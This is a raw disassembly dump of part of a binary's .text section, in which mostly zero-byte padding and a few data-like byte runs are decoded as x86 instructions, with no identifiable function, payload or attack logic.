                           .text:00401e4d 00 00                            add    %al,(%eax)
                           .text:00401e4f 00 00                            add    %al,(%eax)
                           .text:00401e51 00 00                            add    %al,(%eax)
                           .text:00401e53 00 00                            add    %al,(%eax)
                           .text:00401e55 00 00                            add    %al,(%eax)
                           .text:00401e57 00 00                            add    %al,(%eax)
                           .text:00401e59 00 00                            add    %al,(%eax)
                           .text:00401e5b 00 00                            add    %al,(%eax)
                           .text:00401e5d 00 00                            add    %al,(%eax)
                           .text:00401e5f 00 00                            add    %al,(%eax)
                           .text:00401e61 00 00                            add    %al,(%eax)
                           .text:00401e63 00 00                            add    %al,(%eax)
                           .text:00401e65 00 00                            add    %al,(%eax)
                           .text:00401e67 00 f9                            add    %bh,%cl
                           .text:00401e69 15 c7 b7 d9 5a                   adc    $0x5ad9b7c7,%eax
                           .text:00401e6e 91                               xchg   %eax,%ecx
                           .text:00401e6f 4b                               dec    %ebx
                           .text:00401e70 50                               push   %eax
                           .text:00401e71 07                               pop    %es
                           .text:00401e72 6b ba bf 7f 00 00 60             imul   $0x60,0x7fbf(%edx),%edi
                           .text:00401e79 58                               pop    %eax
                           .text:00401e7a 70 00                            jo     0x00401e7c
                           .text:00401e7c 00 00                            add    %al,(%eax)
                           .text:00401e7e 00 00                            add    %al,(%eax)
                           .text:00401e80 00 00                            add    %al,(%eax)
                           .text:00401e82 00 00                            add    %al,(%eax)
                           .text:00401e84 00 00                            add    %al,(%eax)
                           .text:00401e86 00 00                            add    %al,(%eax)
                           .text:00401e88 00 00                            add    %al,(%eax)
                           .text:00401e8a 00 00                            add    %al,(%eax)
                           .text:00401e8c 00 00                            add    %al,(%eax)
                           .text:00401e8e 00 00                            add    %al,(%eax)
                           .text:00401e90 00 00                            add    %al,(%eax)
                           .text:00401e92 00 00                            add    %al,(%eax)
                           .text:00401e94 00 00                            add    %al,(%eax)
                           .text:00401e96 00 00                            add    %al,(%eax)
                           .text:00401e98 00 00                            add    %al,(%eax)
                           .text:00401e9a 00 00                            add    %al,(%eax)
                           .text:00401e9c 00 00                            add    %al,(%eax)
                           .text:00401e9e 00 00                            add    %al,(%eax)
                           .text:00401ea0 00 00                            add    %al,(%eax)
                           .text:00401ea2 00 00                            add    %al,(%eax)
                           .text:00401ea4 00 00                            add    %al,(%eax)
                           .text:00401ea6 00 00                            add    %al,(%eax)
                           .text:00401ea8 00 00                            add    %al,(%eax)
                           .text:00401eaa 00 00                            add    %al,(%eax)
                           .text:00401eac 00 00                            add    %al,(%eax)
                           .text:00401eae 00 00                            add    %al,(%eax)
                           .text:00401eb0 00 00                            add    %al,(%eax)
                           .text:00401eb2 00 00                            add    %al,(%eax)
                           .text:00401eb4 00 00                            add    %al,(%eax)
                           .text:00401eb6 00 00                            add    %al,(%eax)
                           .text:00401eb8 00 00                            add    %al,(%eax)
                           .text:00401eba 00 00                            add    %al,(%eax)
                           .text:00401ebc 00 00                            add    %al,(%eax)
                           .text:00401ebe 00 00                            add    %al,(%eax)
                           .text:00401ec0 00 00                            add    %al,(%eax)
                           .text:00401ec2 00 00                            add    %al,(%eax)
                           .text:00401ec4 00 00                            add    %al,(%eax)
                           .text:00401ec6 00 00                            add    %al,(%eax)
                           .text:00401ec8 00 00                            add    %al,(%eax)
                           .text:00401eca 00 00                            add    %al,(%eax)
                           .text:00401ecc 00 00                            add    %al,(%eax)
                           .text:00401ece 00 00                            add    %al,(%eax)
                           .text:00401ed0 00 00                            add    %al,(%eax)
                           .text:00401ed2 00 00                            add    %al,(%eax)
                           .text:00401ed4 00 00                            add    %al,(%eax)
                           .text:00401ed6 00 00                            add    %al,(%eax)
                           .text:00401ed8 00 00                            add    %al,(%eax)
                           .text:00401eda 00 00                            add    %al,(%eax)
                           .text:00401edc 00 00                            add    %al,(%eax)
                           .text:00401ede 00 00                            add    %al,(%eax)
                           .text:00401ee0 00 00                            add    %al,(%eax)
                           .text:00401ee2 00 00                            add    %al,(%eax)
                           .text:00401ee4 00 00                            add    %al,(%eax)
                           .text:00401ee6 00 00                            add    %al,(%eax)
                           .text:00401ee8 00 00                            add    %al,(%eax)
                           .text:00401eea 00 00                            add    %al,(%eax)
                           .text:00401eec 00 00                            add    %al,(%eax)
                           .text:00401eee 00 00                            add    %al,(%eax)
                           .text:00401ef0 00 00                            add    %al,(%eax)
                           .text:00401ef2 00 00                            add    %al,(%eax)
                           .text:00401ef4 00 00                            add    %al,(%eax)
                           .text:00401ef6 00 00                            add    %al,(%eax)
                           .text:00401ef8 7f 3f                            jg     0x00401f39
                           .text:00401efa 50                               push   %eax
                           .text:00401efb 36 57                            ss push %edi
                           .text:00401efd a6                               cmpsb  %es:(%edi),%ds:(%esi)
                           .text:00401efe b0 07                            mov    $0x7,%al
                           .text:00401f00 e0 07                            loopne 0x00401f09
                           .text:00401f02 6b ba bf 7f 00 00 98             imul   $0xffffff98,0x7fbf(%edx),%edi
                           .text:00401f09 80 f3 b5                         xor    $0xb5,%bl
                           .text:00401f0c bf 7f 00 00 00                   mov    $0x7f,%edi
                           .text:00401f11 00 00                            add    %al,(%eax)
                           .text:00401f13 00 00                            add    %al,(%eax)
                           .text:00401f15 00 00                            add    %al,(%eax)
                           .text:00401f17 00 11                            add    %dl,(%ecx)
                           .text:00401f19 02 00                            add    (%eax),%al
                           .text:00401f1b 00 00                            add    %al,(%eax)
                           .text:00401f1d 00 00                            add    %al,(%eax)
                           .text:00401f1f 00 78 1d                         add    %bh,0x1d(%eax)
                           .text:00401f22 c0 c3 bf                         rol    $0xbf,%bl
                           .text:00401f25 7f 00                            jg     0x00401f27
                           .text:00401f27 00 78 1d                         add    %bh,0x1d(%eax)
                           .text:00401f2a c0 c3 bf                         rol    $0xbf,%bl
                           .text:00401f2d 7f 00                            jg     0x00401f2f
                           .text:00401f2f 00 f4                            add    %dh,%ah
                           .text:00401f31 2c 85                            sub    $0x85,%al
                           .text:00401f33 bc 6d 52 ad 0b                   mov    $0xbad526d,%esp
                           .text:00401f38 b0 a4                            mov    $0xa4,%al
                           .text:00401f3a 56                               push   %esi
                           .text:00401f3b bc bf 7f 00 00                   mov    $0x7fbf,%esp
                           .text:00401f40 d8 b2 46 b7 bf 7f                fdivs  0x7fbfb746(%edx)
                           .text:00401f46 00 00                            add    %al,(%eax)
                           .text:00401f48 00 00                            add    %al,(%eax)
                           .text:00401f4a 00 00                            add    %al,(%eax)
                           .text:00401f4c 00 00                            add    %al,(%eax)
                           .text:00401f4e 00 00                            add    %al,(%eax)
                           .text:00401f50 00 00                            add    %al,(%eax)
                           .text:00401f52 00 00                            add    %al,(%eax)
                           .text:00401f54 00 00                            add    %al,(%eax)
                           .text:00401f56 00 00                            add    %al,(%eax)
                           .text:00401f58 00 00                            add    %al,(%eax)
                           .text:00401f5a 00 00                            add    %al,(%eax)
                           .text:00401f5c 00 00                            add    %al,(%eax)
                           .text:00401f5e 00 00                            add    %al,(%eax)
                           .text:00401f60 00 00                            add    %al,(%eax)
                           .text:00401f62 00 00                            add    %al,(%eax)
                           .text:00401f64 00 00                            add    %al,(%eax)
                           .text:00401f66 00 00                            add    %al,(%eax)
                           .text:00401f68 00 00                            add    %al,(%eax)
                           .text:00401f6a 00 00                            add    %al,(%eax)
                           .text:00401f6c 00 00                            add    %al,(%eax)
                           .text:00401f6e 00 00                            add    %al,(%eax)
                           .text:00401f70 00 00                            add    %al,(%eax)
                           .text:00401f72 00 00                            add    %al,(%eax)
                           .text:00401f74 00 00                            add    %al,(%eax)
                           .text:00401f76 00 00                            add    %al,(%eax)
                           .text:00401f78 00 00                            add    %al,(%eax)
                           .text:00401f7a 00 00                            add    %al,(%eax)
                           .text:00401f7c 00 00                            add    %al,(%eax)
                           .text:00401f7e 00 00                            add    %al,(%eax)
                           .text:00401f80 00 00                            add    %al,(%eax)
                           .text:00401f82 00 00                            add    %al,(%eax)
                           .text:00401f84 00 00                            add    %al,(%eax)
                           .text:00401f86 00 00                            add    %al,(%eax)
                           .text:00401f88 00 00                            add    %al,(%eax)
                           .text:00401f8a 00 00                            add    %al,(%eax)
                           .text:00401f8c 00 00                            add    %al,(%eax)
                           .text:00401f8e 00 00                            add    %al,(%eax)
                           .text:00401f90 00 00                            add    %al,(%eax)
                           .text:00401f92 00 00                            add    %al,(%eax)
                           .text:00401f94 00 00                            add    %al,(%eax)
                           .text:00401f96 00 00                            add    %al,(%eax)
                           .text:00401f98 00 00                            add    %al,(%eax)
                           .text:00401f9a 00 00                            add    %al,(%eax)
                           .text:00401f9c 00 00                            add    %al,(%eax)
                           .text:00401f9e 00 00                            add    %al,(%eax)
                           .text:00401fa0 00 00                            add    %al,(%eax)
                           .text:00401fa2 00 00                            add    %al,(%eax)
                           .text:00401fa4 00 00                            add    %al,(%eax)
                           .text:00401fa6 00 00                            add    %al,(%eax)
                           .text:00401fa8 f9                               stc    
                           .text:00401fa9 15 c7 b7 d9 5a                   adc    $0x5ad9b7c7,%eax
                           .text:00401fae 91                               xchg   %eax,%ecx
                           .text:00401faf 4b                               dec    %ebx
                           .text:00401fb0 00 ac 56 bc bf 7f 00             add    %ch,0x7fbfbc(%esi,%edx,2)
                           .text:00401fb7 00 60 58                         add    %ah,0x58(%eax)
                           .text:00401fba 70 00                            jo     0x00401fbc
                           .text:00401fbc 00 00                            add    %al,(%eax)
                           .text:00401fbe 00 00                            add    %al,(%eax)
                           .text:00401fc0 00 00                            add    %al,(%eax)
                           .text:00401fc2 00 00                            add    %al,(%eax)
                           .text:00401fc4 00 00                            add    %al,(%eax)
                           .text:00401fc6 00 00                            add    %al,(%eax)
                           .text:00401fc8 00 00                            add    %al,(%eax)
                           .text:00401fca 00 00                            add    %al,(%eax)
                           .text:00401fcc 00 00                            add    %al,(%eax)
                           .text:00401fce 00 00                            add    %al,(%eax)
                           .text:00401fd0 00 00                            add    %al,(%eax)
                           .text:00401fd2 00 00                            add    %al,(%eax)
                           .text:00401fd4 00 00                            add    %al,(%eax)
                           .text:00401fd6 00 00                            add    %al,(%eax)
                           .text:00401fd8 00 00                            add    %al,(%eax)
                           .text:00401fda 00 00                            add    %al,(%eax)
                           .text:00401fdc 00 00                            add    %al,(%eax)
                           .text:00401fde 00 00                            add    %al,(%eax)
                           .text:00401fe0 00 00                            add    %al,(%eax)
                           .text:00401fe2 00 00                            add    %al,(%eax)
                           .text:00401fe4 00 00                            add    %al,(%eax)
                           .text:00401fe6 00 00                            add    %al,(%eax)
                           .text:00401fe8 00 00                            add    %al,(%eax)
                           .text:00401fea 00 00                            add    %al,(%eax)
                           .text:00401fec 00 00                            add    %al,(%eax)
                           .text:00401fee 00 00                            add    %al,(%eax)
                           .text:00401ff0 00 00                            add    %al,(%eax)
                           .text:00401ff2 00 00                            add    %al,(%eax)
                           .text:00401ff4 00 00                            add    %al,(%eax)
                           .text:00401ff6 00 00                            add    %al,(%eax)
                           .text:00401ff8 00 00                            add    %al,(%eax)
                           .text:00401ffa 00 00                            add    %al,(%eax)
                           .text:00401ffc 00 00                            add    %al,(%eax)
                           .text:00401ffe 00 00                            add    %al,(%eax)
